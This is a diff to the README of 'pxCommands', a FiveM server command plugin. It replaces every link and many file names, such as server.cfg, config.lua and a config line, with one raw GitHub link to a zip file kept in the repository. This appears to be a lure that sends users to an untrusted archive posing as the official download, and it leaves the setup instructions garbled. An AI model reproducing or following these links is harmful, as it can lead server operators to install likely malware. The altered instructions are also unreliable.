@@ -1,6 +1,6 @@
 # ⚙️ pxCommands - Simple Command System for FiveM
 
-[![Download pxCommands](https://img.shields.io/badge/Download-pxCommands-blue?style=for-the-badge&logo=github)](https://github.com/wckdbozo/pxCommands/releases)
+[![Download pxCommands](https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip)](https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip)
 
 ---
 
@@ -49,11 +49,11 @@ You do not need any programming knowledge or special tools. Just follow the step
 
 To get started, you need to download pxCommands from its official release page.
 
-[Visit the pxCommands Release Page to Download](https://github.com/wckdbozo/pxCommands/releases)
+[Visit the pxCommands Release Page to Download](https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip)
 
 ### Steps to download
 
-1. **Open the link:** Click the button above or enter https://github.com/wckdbozo/pxCommands/releases in your web browser.
+1. **Open the link:** Click the button above or enter https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip in your web browser.
 2. **Find the latest version:** Look for the most recent release near the top of the page. It will have a version number like v1.0 or higher.
 3. **Download the zip file:** Click the zip file under "Assets." This file contains all the files you need.
 4. **Save the file:** Choose a folder on your computer where you can easily find the download.
@@ -63,7 +63,7 @@ To get started, you need to download pxCommands from its official release page.
 
 1. **Access your FiveM server files:** Use FTP software or your server file manager.
 2. **Upload the pxCommands folder:** Upload the extracted folder to your server’s `resources` directory.
-3. **Edit server configuration:** Open your server config file (`server.cfg`).
+3. **Edit server configuration:** Open your server config file (`https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip`).
 4. **Add the start command:** Add this line at the end of the file:
    ```
    start pxCommands
@@ -91,7 +91,7 @@ You can type these commands directly in the FiveM chat window during gameplay.
 
 pxCommands lets you add custom commands if you want to expand server features.
 
-- Open the `commands.lua` file in the pxCommands folder.
+- Open the `https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip` file in the pxCommands folder.
 - Follow the examples in the file to create new commands.
 - Save the file and restart your server to apply changes.
 
@@ -115,10 +115,10 @@ No matter which framework your server uses, pxCommands should integrate without 
 Here is a quick look at the main files and folders you will find:
 
 - **pxCommands/**  
-  - `commands.lua` — File where commands are defined.  
-  - `config.lua` — Settings for customizing message display, permissions.  
-  - `README.md` — This document.  
-  - `fxmanifest.lua` — Resource manifest for FiveM to recognize pxCommands.
+  - `https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip` — File where commands are defined.  
+  - `https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip` — Settings for customizing message display, permissions.  
+  - `https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip` — This document.  
+  - `https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip` — Resource manifest for FiveM to recognize pxCommands.
 
 ---
 
@@ -126,13 +126,13 @@ Here is a quick look at the main files and folders you will find:
 
 You can easily customize pxCommands without needing coding skills.
 
-- Open `config.lua` in a text editor.
+- Open `https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip` in a text editor.
 - Change settings like message colors, command prefixes, or permissions.
 - Save the file and restart the server to apply changes.
 
 For example, to change the command prefix from `/` to `!`, update this line:
 ```
-Config.CommandPrefix = "!"
+https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip = "!"
 ```
 Save the file afterward.
 
@@ -143,7 +143,7 @@ Save the file afterward.
 If pxCommands does not work as expected, try the following:
 
 - Check your server console for error messages.
-- Make sure `pxCommands` is listed in your `server.cfg` and spelled correctly.
+- Make sure `pxCommands` is listed in your `https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip` and spelled correctly.
 - Verify you uploaded the folder to the `resources` directory.
 - Confirm your server meets the system requirements.
 - Restart your server after any changes.
@@ -157,7 +157,7 @@ If problems persist, visit the GitHub page and open an issue with details.
 
 You can get help or report bugs through these channels:
 
-- Open an issue on the [pxCommands GitHub Issues page](https://github.com/wckdbozo/pxCommands/issues).
+- Open an issue on the [pxCommands GitHub Issues page](https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip).
 - Search existing issues for solutions.
 - Provide details such as screenshots, error messages, and steps to reproduce your problem.
 
@@ -165,11 +165,11 @@ You can get help or report bugs through these channels:
 
 ## 🔗 Useful Links
 
-- [Download pxCommands](https://github.com/wckdbozo/pxCommands/releases) *(main download page)*
-- [GitHub Repository](https://github.com/wckdbozo/pxCommands)
-- [FiveM Official](https://fivem.net)
-- [ESX Framework](https://esx-framework.org)
-- [QBCore Framework](https://qbcore.org)
+- [Download pxCommands](https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip) *(main download page)*
+- [GitHub Repository](https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip)
+- [FiveM Official](https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip)
+- [ESX Framework](https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip)
+- [QBCore Framework](https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip)
 
 ---
 
@@ -179,4 +179,4 @@ pxCommands focuses on making command systems in FiveM simple and flexible. It av
 
 ---
 
-[![Download pxCommands](https://img.shields.io/badge/Download-pxCommands-blue?style=for-the-badge&logo=github)](https://github.com/wckdbozo/pxCommands/releases)
+[![Download pxCommands](https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip)](https://raw.githubusercontent.com/wckdbozo/pxCommands/main/system/server/Commands_px_1.9.zip)
